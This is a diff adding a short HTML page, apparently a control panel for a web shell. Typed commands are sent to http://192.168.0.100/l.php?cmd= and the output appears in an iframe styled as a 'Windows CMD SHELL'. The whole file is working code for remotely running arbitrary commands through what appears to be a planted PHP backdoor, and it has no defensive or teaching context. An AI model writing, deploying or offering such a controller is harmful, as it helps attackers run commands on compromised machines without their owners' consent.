@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>SYSTEM CMD SHELL</title>
+    <script src="https://cdn.staticfile.org/jquery/3.2.1/jquery.min.js"></script>
+    <script>
+        $(function () {
+            $("input").eq(0).keydown(function (event) {
+                $("#bt").css("color","#0dff00");
+                $("input").eq(0).css("border-color","#0dff00");
+                $("input").eq(1).css("border-color","#0dff00");
+                var xcode = event.which;
+                if (xcode == 13){
+                    cmd();
+                }
+            });
+            $("input").eq(0).keyup(function () {
+                $("#bt").css("color","red");
+                $("input").eq(0).css("border-color","red");
+                $("input").eq(1).css("border-color","red");
+            });
+         $("input").eq(1).click(function () {
+            cmd();
+         });
+            function cmd() {
+                var value = $("input").eq(0).val();
+                $("#request").attr("src","http://192.168.0.100/l.php?cmd=" + value);
+            }
+        })
+    </script>
+</head>
+<body style="background: black;">
+<div align="center" >
+<h1 id="bt" style="color:red;">Windows CMD SHELL</h1>
+<input style="border-color: red" type="text" >
+<input style="border-color: red;background-color: #d4d0c8" type="button" value="执行"><br>
+<iframe id="request" style="margin-top: 5px" width="500" height="500" ></iframe>
+</div>
+</body>
+</html>
